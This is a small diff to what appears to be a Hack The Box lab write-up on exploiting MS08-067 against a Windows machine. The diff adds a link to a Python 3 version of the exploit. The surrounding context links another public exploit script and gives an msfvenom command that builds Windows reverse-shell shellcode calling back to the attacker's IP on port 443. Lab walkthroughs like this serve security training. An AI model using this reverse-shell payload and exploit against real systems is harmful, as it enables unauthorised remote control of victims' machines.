@@ -115,7 +115,9 @@ Host script results:
 
 On the web we can find different exploit scripts: https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py.
 
-After reading the code, we can see that the exploit requires us to replace the default shellcode with a custom one. To make the shellcode, we can use the following options in `msfvenom`:
+**Note**: If we were on Python3 -> https://raw.githubusercontent.com/Agent-Tiro/HackTheBoxScripts/master/Python3-MS08-067.py
+
+After reading the code, we can see that the exploit requires us to replace the default shellcode with a custom one with our own machine IP. To create the shellcode, we can use the following options in `msfvenom`:
 
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.8 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows -v shellcode
